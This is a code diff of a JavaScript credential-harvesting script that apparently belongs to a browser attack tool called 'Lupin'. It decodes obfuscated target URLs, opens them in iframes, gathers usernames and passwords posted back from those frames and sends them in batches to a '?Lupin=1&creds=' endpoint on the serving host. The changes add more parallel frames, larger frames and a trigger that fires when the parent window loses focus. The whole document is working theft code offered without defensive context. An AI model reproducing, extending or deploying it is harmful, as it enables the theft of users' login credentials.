@@ -1,151 +1,146 @@
-        
-        
-        var creds = "";
-        var thresh = 5;
-        var numSlaves = 1;
-        var chunkLen = targets.length; 
+var creds = "";
+var thresh = 1;
+var maxSlaves = 10;
+var finishedSlaves = 0;	
+var numSlaves;
+var targetIndexArray;
+var chunkLenArray;
 
-        if(targets.length > 100){
-            numSlaves = 5;
-        }else if(targets.length > 50){
-            numSlaves = 4;
-        }else if(targets.length > 25){
-            numSlaves = 3;
-        }else if(targets.length > 10){
-            numSlaves = 2;
-        }
-     
-        if(numSlaves >1 ){
-            chunkLen = Math.ceil(targets.length / numSlaves);
-        }
 
-        var targetIndexArray = new Array(numSlaves);
-        var finishedSlaves = 0;
-       
-        for(var i=0; i<numSlaves;i++){
-            targetIndexArray[i] = i*chunkLen;
-        }
-        
-     
-        function deobfs(string)
-        {
-
-            var deobfs = "";
-            nums = string.split(".")
-            
-            for (i=0; i<nums.length; i+=1)
-            {
-                k = parseInt(nums[i])-255
+           
+function deobfs(string){
+	var nums = string.split(".")
+        var deobfs = "";
+	var k;
+           
+        for (i=0; i<nums.length; i+=1){
+        	k = parseInt(nums[i])-255;
                 deobfs+=String.fromCharCode(k);
-            }
-            return deobfs;
-         }
-
-
-        function createSlaveFrame(slaveFrameNum) 
-        { 
-
-            slaveFrame = document.createElement("IFRAME"); 
-
-            if (slaveFrameNum == -1){ 
-                d_src = "http://"+document.location.hostname+"?Lupin=NOTHING"           
-            }else{
-                src = targets[targetIndexArray[slaveFrameNum]];
-                d_src = deobfs(src);
-                targetIndexArray[slaveFrameNum] += 1;
-            }
-
-            slaveFrame.setAttribute("src", d_src); 
-            slaveFrame.setAttribute("height", "1");
-            slaveFrame.setAttribute("width", "1");
-            slaveFrame.setAttribute("id", "slaveFrame"+slaveFrameNum.toString());
-            slaveFrame.setAttribute("name", "slaveFrame"+slaveFrameNum.toString());
-            document.body.appendChild(slaveFrame); 
-
-        } 
-
-        function init() 
-        {
-            if (window.addEventListener) 
-            {  // all browsers except IE before version 9
-                window.addEventListener ("message", OnMessage, false);
-            }
-            else 
-            {
-                if (window.attachEvent) 
-                {   // IE before version 9
-                    window.attachEvent("onmessage", OnMessage);
-                }
-            }
-          
-                     
-            for(var j=-1;j<numSlaves;j+=1){
-                  createSlaveFrame(j);
-
-            }
         }
+	return deobfs;
+}
+
+
+function moveSrc(slaveFrameNum){
+
+	var slaveFrameName = "slaveFrame"+slaveFrameNum.toString();
+        var slaveFrame= document.getElementsByName(slaveFrameName)[0]; 
+	var src = targets[targetIndexArray[slaveFrameNum]];
+
+        targetIndexArray[slaveFrameNum] +=1;
+        slaveFrame.setAttribute('src', 	deobfs(src) );
+}
+
+
+function createSlaveFrame(slaveFrameNum) { 
+
+	var slaveFrame = document.createElement("IFRAME"); 
+
+        if (slaveFrameNum == -1){ 
+        	slaveFrame.setAttribute("src","http://"+document.location.hostname+"?Lupin=NOTHING");         
+        }
+        slaveFrame.setAttribute("height", "200");
+        slaveFrame.setAttribute("width", "200");
+        slaveFrame.setAttribute("id", "slaveFrame"+slaveFrameNum.toString());
+        slaveFrame.setAttribute("name", "slaveFrame"+slaveFrameNum.toString());
+        document.body.appendChild(slaveFrame); 
+
+} 
+
 
        
            
-        function OnMessage (event) 
-        {
-            var message = event.data;
-            var ef_chunkLen = chunkLen;
-            var cash = message.indexOf("$$$");
-            var slaveFrameName = message.substring(0,cash);
-            var slaveFrame= document.getElementsByName(slaveFrameName)[0]; 
-            var slaveFrameNum = parseInt(slaveFrameName.substring(10));
+function onMessage (event){
+	var m = event.data;
+        var cash = m.indexOf("$$$");
+        var slaveFrameName = m.substring(0,cash);
+        var slaveFrameNum = parseInt(slaveFrameName.substring(10));
+        m = m.substring(cash+3);
+	var arr = m.split(",");
+	var cut;
+	var credCount;
 
-            message = message.substring(cash+3);
-            var arr = message.split(",");
+	
+        if (m != ""){
+	        creds+="|"+arr[0]+"|"+arr[1]+"|"+arr[2]+"|||||";
 
-            if (message != "") 
-            {
-                creds+="|"+arr[0]+"|"+arr[1]+"|"+arr[2]+"|||||";
-            }
-         
+        }
+      
+        cut = creds.lastIndexOf("|||||");
+        if(finishedSlaves == numSlaves){
+	        if(cut > -1){     
 
-            
-            if( targetIndexArray[slaveFrameNum] < targets.length && 
-                targetIndexArray[slaveFrameNum] < slaveFrameNum*chunkLen+chunkLen)
-            {
-                src = targets[targetIndexArray[slaveFrameNum]];
-                d_src = deobfs(src);
-                targetIndexArray[slaveFrameNum] +=1;
-
-                slaveFrame.setAttribute('src', d_src );
-            }else
-            {
-                finishedSlaves+=1;
-                //document.body.removeChild(slaveFrameName);
-
-            }
-
-
-            var cut = creds.lastIndexOf("|||||");
-            if(finishedSlaves == numSlaves)
-            {
-               if(cut > -1) 
-               {     
-                   src = "http://"+document.location.hostname+"?Lupin=KILL&creds=";          
-                   document.location.replace(src+creds.substring(0,cut));               
-               }else
-               {
-                   src = "http://"+document.location.hostname+"?Lupin=KILL";
-                   document.location.replace(src)
+			src = "http://"+document.location.hostname+"?Lupin=1&creds=";
+                	sendFrame = document.getElementsByName("slaveFrame-1")[0];
+                	sendFrame.setAttribute('src',src+creds.substring(0,cut));               
+		}
+      
+		src = "http://"+document.location.hostname+"?Lupin=KILL";
+		document.location.replace(src); 
+		return;  
+        }else{   
+		credCount = creds.split("|||||").length - 1;
+	
+                if(credCount == thresh) {   
+   	             src = "http://"+document.location.hostname+"?Lupin=1&creds=";
+                     sendFrame = document.getElementsByName("slaveFrame-1")[0];
+                     sendFrame.setAttribute('src',src+creds.substring(0,cut));               
+                     creds = "";
                }
-            }else
-            {   
+        }  
 
-               credCount = creds.split("|||||").length - 1;
-               if(credCount == thresh) 
-               {   
-                   //alert(creds+"\n"+creds.substring(0,cut));
+	if(targetIndexArray[slaveFrameNum] < chunkLenArray[slaveFrameNum]){
+	      	moveSrc(slaveFrameNum);
+        }else{
+	        finishedSlaves+=1;
+        }
+  	
 
-                   src = "http://"+document.location.hostname+"?Lupin=1&creds=";
-                   sendFrame = document.getElementsByName("slaveFrame-1")[0];
-                   sendFrame.setAttribute('src',src+creds.substring(0,cut));               
-                   creds = "";
-               }
-            }  
-        }   
+}   
+
+function onBlur(){
+	for(var i=0; i<numSlaves;i++){
+		moveSrc(i);
+	}
+        window.parent.removeEventListener("blur", onBlur, false);
+
+}
+
+function init(){
+
+	var i;
+	var rem;
+	if(targets.length > maxSlaves){
+		numSlaves = maxSlaves;
+	}else{
+		numSlaves = targets.length;
+	}
+ 
+	targetIndexArray = new Array(numSlaves);
+	chunkLenArray = new Array(numSlaves);
+
+	var chunkLen = Math.floor(targets.length / numSlaves);
+
+      	tmp = 0;
+	rem = targets.length - numSlaves*chunkLen;
+       	for(i=0; i<numSlaves;i++){
+       		targetIndexArray[i] = tmp;
+    		tmp += chunkLen;
+		if(i<rem){
+			tmp+=1;
+    		}
+		chunkLenArray[i] = tmp;
+       	}
+	
+	for(i=-1;i<numSlaves;i+=1){
+                createSlaveFrame(i);
+      	}
+
+	window.addEventListener ("message", onMessage, false);
+	window.parent.addEventListener ("blur", onBlur, false);
+
+}
+
+
+
+
